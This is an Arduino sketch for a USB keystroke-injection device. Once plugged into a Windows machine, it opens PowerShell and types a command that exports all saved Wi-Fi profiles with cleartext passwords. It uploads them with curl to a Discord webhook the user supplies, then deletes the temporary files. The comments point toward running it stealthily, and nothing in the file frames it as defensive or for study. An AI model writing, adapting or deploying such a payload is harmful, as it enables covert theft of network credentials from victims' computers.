#include "KeyboardES_ES_Beetle.h"

KeyboardES_ES_Beetle kbd;

// IMPORTANT: Replace the URL below with your own Discord Webhook URL
const char* discordUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE";

void setup() {
  delay(4000); 
  kbd.begin();

  // 1. Open RUN dialog
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.write('r');
  delay(200);
  Keyboard.releaseAll();
  delay(600);

  // 2. Open PowerShell from RUN
  kbd.printES("powershell -NoP"); 
  kbd.tap(40); 
  delay(2500); // Wait for the console to appear

  // 3. Define the Webhook URL variable
  kbd.printES("$u='");
  for(int i=0; i < strlen(discordUrl); i++) {
    char c[2] = {discordUrl[i], '\0'};
    kbd.printES(c);
    delay(10); 
  }
  kbd.printES("'");
  kbd.tap(40);

  // 4. Export Wi-Fi profiles + Send to Discord + Cleanup
  // This command extracts passwords, sends them via curl, and deletes the temporary files
  kbd.printES("netsh wlan export profile key=clear folder=$env:temp; gci $env:temp\\*.xml | % { curl.exe -F file=@$($_.FullName) $u ; rm $_.FullName }");
  kbd.tap(40);

  // Close the console (optional, add if you want it stealthy)
  // kbd.printES("exit");
  // kbd.tap(40);

  kbd.end();
}

void loop() {}
